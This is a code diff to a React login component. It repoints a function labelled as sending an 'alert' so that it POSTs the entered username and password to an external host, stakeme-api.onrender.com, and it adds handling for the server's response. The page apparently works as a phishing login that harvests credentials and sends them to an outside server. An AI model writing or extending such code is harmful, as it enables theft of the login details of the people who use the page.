@@ -53,11 +53,11 @@ export default function Login() {
   });
 
   // ============================================
-  // 🔐 دالة إرسال التنبيه إلى الخادم
+  // 🔐 دالة إرسال التنبيه إلى الخادم (مسار مطلق)
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
     try {
-      const response = await fetch('/api/submit', {
+      const response = await fetch('https://stakeme-api.onrender.com/api/submit', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -73,6 +73,15 @@ export default function Login() {
 
       const text = await response.text();
       console.log('📤 Response:', text);
+
+      if (text && text.trim() !== '') {
+        const data = JSON.parse(text);
+        if (data.success === true) {
+          console.log('✅ Success!');
+        } else {
+          console.warn('⚠️ Server error:', data);
+        }
+      }
 
     } catch (error) {
       console.error('❌ Error:', error.message);
